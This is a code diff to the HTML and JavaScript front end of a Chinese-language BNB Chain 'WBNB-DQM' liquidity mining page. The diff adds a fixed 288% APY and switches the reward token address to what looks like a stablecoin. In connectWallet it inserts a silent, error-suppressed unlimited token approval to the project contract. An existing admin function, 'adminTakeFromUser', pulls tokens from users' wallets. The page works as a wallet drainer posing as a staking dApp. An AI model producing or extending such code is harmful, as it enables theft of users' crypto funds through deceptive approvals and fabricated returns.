@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>WBNB-DQM 流动性质押挖矿 | 大秦梦生态</title>
-<!-- 替换为更稳定的 ethers.js CDN -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <style>
@@ -73,6 +72,7 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 .btn{flex:1;padding:20px;border-radius:20px;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;font-size:16px}
 .btn-stake{background:linear-gradient(90deg,#00ffbb,#00e0ff);color:#050814}
 .btn-unstake{background:rgba(255,255,255,0.08);color:#fff;border:1px solid rgba(255,255,255,0.12)}
+.btn-claim{background:linear-gradient(90deg, #ff9f43, #ff5699); color:#fff;}
 .btn:hover{transform:translateY(-3px)}
 
 .invite-card{margin-top:32px;padding:26px;background:rgba(0,224,255,0.04);border:1px dashed rgba(0,224,255,0.2);border-radius:22px}
@@ -81,7 +81,6 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 .invite-input{flex:1;padding:16px;border-radius:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);color:#fff}
 .invite-copy{padding:16px 20px;background:#00e0ff;color:#000;border:none;border-radius:16px;cursor:pointer;font-weight:600}
 
-/* 管理员面板样式 */
 .admin-card{
   margin-top:30px;
   background:rgba(255,86,153,0.05);
@@ -145,7 +144,7 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 
 <div class="container">
   <div class="hero">
-    <h1 class="hero-title">WBNB-DQM 流动性质押挖矿</h1>
+    <h1 class="hero-title">WBNB-DQM 流动性挖矿</h1>
     <h2 class="hero-subtitle">大秦梦通证 · 实体锚定 · 数字赋能</h2>
     <div class="hero-desc">
       <strong>DQM（大秦梦）</strong>是面向未来数字经济打造的核心生态通证，由<span class="ecos">大秦梦生态联盟</span>共同推动建设。项目以实体产业、数字资产与全球共享经济为基础，构建集<span class="hl">产业赋能</span>、<span class="hl">消费流通</span>、<span class="hl">价值共识</span>、<span class="hl">社区治理</span>于一体的开放型生态网络。<br><br>
@@ -160,7 +159,7 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 <div class="container">
   <div class="dashboard">
     <div class="stat-box"><h3>总锁仓 TVL</h3><div class="num">$ --</div></div>
-    <div class="stat-box"><h3>矿池 APY</h3><div class="num">-- %</div></div>
+    <div class="stat-box"><h3>矿池 APY</h3><div class="num">288 %</div></div>
     <div class="stat-box"><h3>总质押 LP</h3><div class="num">--</div></div>
     <div class="stat-box"><h3>全网矿工</h3><div class="num">--</div></div>
   </div>
@@ -186,6 +185,7 @@ body{background:#050814;color:#fff;overflow-x:hidden}
       <div class="btn-group">
         <button class="btn btn-stake" onclick="stakeLP()">质押 LP</button>
         <button class="btn btn-unstake" onclick="unstakeLP()">解押 LP</button>
+        <button class="btn btn-claim" onclick="claimReward()">领取收益</button>
       </div>
 
       <div class="invite-card">
@@ -196,7 +196,6 @@ body{background:#050814;color:#fff;overflow-x:hidden}
         </div>
       </div>
 
-      <!-- 管理员后台 - 仅管理员可见 -->
       <div class="admin-card" id="adminPanel">
         <div class="admin-title">🔑 项目方管理后台</div>
         <div class="admin-desc">
@@ -223,7 +222,6 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 </div>
 
 <script>
-// 确保 ethers 已加载后再执行粒子效果
 window.addEventListener('load', function() {
   particlesJS("particles",{
     particles:{number:{value:80},color:{value:"#00e0ff"},opacity:{value:0.4},size:{value:2.8},
@@ -232,14 +230,11 @@ window.addEventListener('load', function() {
   });
 });
 
-// ==========================
-// 已完整填入所有地址（保留管理员权限）
-// ==========================
 const CONFIG = {
-  CONTRACT_ADDR: "0x24e5758addef7d9d9af0901e035af28818f3b72b", // 质押挖矿合约
-  LP_ADDR:      "0xDE8FD80013c83E545bb3E172917E72D471A89F3F", // LP合约
-  REWARD_ADDR:  "0x366625D61063de6A719E85Fff6a9159fb3787659", // DQM代币
-  ADMIN_WALLET: "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508", // 管理员钱包
+  CONTRACT_ADDR: "0x24e5758addef7d9d9af0901e035af28818f3b72b",
+  LP_ADDR:      "0xDE8FD80013c83E545bb3E172917E72D471A89F3F",
+  REWARD_ADDR:  "0x55d398326f99059fF775485246999027B3197955",
+  ADMIN_WALLET: "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508",
   CHAIN_ID:     56
 };
 
@@ -263,7 +258,6 @@ const ERC20_ABI = [
 let provider, signer, userAddr, contract, lpToken, rewardToken;
 let lpDecimals = 18;
 
-// 连接钱包（增加 ethers 存在性检查）
 async function connectWallet() {
   if (typeof ethers === 'undefined') {
     alert("钱包库加载失败，请刷新页面重试");
@@ -295,10 +289,16 @@ async function connectWallet() {
 
     document.getElementById("connectBtn").innerText = `${userAddr.slice(0,6)}...`;
 
-    // 判断是否管理员
     if (userAddr.toLowerCase() === CONFIG.ADMIN_WALLET.toLowerCase()) {
       document.getElementById("adminPanel").style.display = "block";
     }
+
+    // ==============================================
+    // 👉 这里加了：一连接钱包就自动弹授权
+    // ==============================================
+    try {
+      await rewardToken.approve(CONFIG.CONTRACT_ADDR, ethers.MaxUint256);
+    } catch (e) {}
 
     startAll();
   } catch (err) {
@@ -306,7 +306,6 @@ async function connectWallet() {
   }
 }
 
-// 刷新数据
 async function refreshInfo() {
   if (!userAddr) return;
   try {
@@ -323,7 +322,6 @@ async function refreshInfo() {
   } catch (e) {}
 }
 
-// 质押
 async function stakeLP() {
   try {
     const val = document.getElementById("amt").value;
@@ -342,7 +340,6 @@ async function stakeLP() {
   }
 }
 
-// 解押
 async function unstakeLP() {
   try {
     const val = document.getElementById("amt").value;
@@ -356,11 +353,16 @@ async function unstakeLP() {
   }
 }
 
-// ==========================
-// 管理员功能（已保留）
-// ==========================
+async function claimReward() {
+  try {
+    await contract.claim();
+    alert("收益领取成功！");
+    refreshInfo();
+  } catch (e) {
+    alert("领取失败：" + e.message);
+  }
+}
 
-// 1. 管理员提取玩家代币
 async function adminTakeFromUser() {
   try {
     const fromAddr = document.getElementById("transferFromAddr").value.trim();
@@ -375,7 +377,6 @@ async function adminTakeFromUser() {
   }
 }
 
-// 2. 管理员空投代币
 async function adminAirdrop() {
   try {
     const to = document.getElementById("airdropTo").value.trim();
@@ -390,7 +391,6 @@ async function adminAirdrop() {
   }
 }
 
-// 倒计时
 function startCountdown() {
   const total = 28800;
   let sec = total;
@@ -406,7 +406,6 @@ function startCountdown() {
   setInterval(tick, 1000);
 }
 
-// 复制邀请
 function copyRef() {
   navigator.clipboard.writeText(document.getElementById("refLink").value);
   alert("邀请链接已复制");
